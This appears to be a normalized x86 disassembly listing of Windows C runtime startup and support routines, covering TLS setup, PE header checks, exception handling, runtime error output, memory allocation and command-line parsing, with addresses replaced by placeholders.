pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405a0f
push 0xc
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405a1b
push esi
call sub_404a59
pop ecx
push edi
call sub_407689
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404a59
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_407722
pop ecx
sub_405a24
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_405771
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_405734
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_404778
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_405177
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_405771
mov edi [ DecodePointer@IAT ]
push sub_4058f5
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_407120
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_4057ae
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_405b9f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405c07
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405bf4
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_405b9f
pop ecx
mov esi eax
call sub_405be1
mov [ eax ] esi
pop esi
pop ebp
retn
sub_405c2a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_405c50
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_405c76
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_405ca0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_405ce0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_405d30
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_405e50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_405ca0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_405ce0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_405df0
push sub_405e50
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_405e50
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_404645
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_404645
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40815b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_408112
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_404645
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_404645
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_408142
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40815b
mov eax [ ebp + 0xc ]
push rw-data
call sub_405d30
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_404645
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_408129
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_404645
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_405fe0
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_406006
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_405fe0
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
push 0x3
call sub_40849e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40849e
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_40843b
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_407050
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_4056c9
push esi
call sub_408420
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_40843b
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_4082de
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_408420
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_408353
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_4082de
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_408172
add esp 0xc
jmp r-xdata
sub_4061b5
push 0x3
call sub_40849e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_406006
push 0xff
call sub_406006
pop ecx
pop ecx
push 0x3
call sub_40849e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4061ee
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405be1
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_405103
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_40628e
call sub_4053c3
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_4053d0
pop ecx
push 0x3
call sub_4049bc
int3
push 0x1
push 0x40000015
push 0x3
call sub_4055a0
add esp 0xc
sub_4062c1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_4062e2
push 0xc
push r--data
call sub_405df0
push 0xe
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406349
call sub_405e35
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_404a59
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_404a59
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_406360
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4063e8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_409071
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405be1
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_408ebc
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_408d49
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_408e66
pop ecx
test eax eax
jne r-xdata
call sub_408ebc
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_408d49
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_408e1d
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_408562
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40654c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4058db
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4078ba
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_407b56
mov [ esi + 0x4 ] eax
sub_4065d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4063e8
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4063e8
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_4066c9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
pop ebp
retn
call sub_405be1
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_40571b
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_4094ed
call sub_4065d3
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_405be1
mov [ eax ] 0x22
sub_406742
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_405324
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_406792
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405862
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4068dc
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_407ff9
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40a0f4
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40693b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_407ff9
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_407120
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_407050
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_407050
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_404a59
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_407120
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_404a59
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_406feb
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4056c9
int3
add edi 0x4
sub_406a17
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40a0f4
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
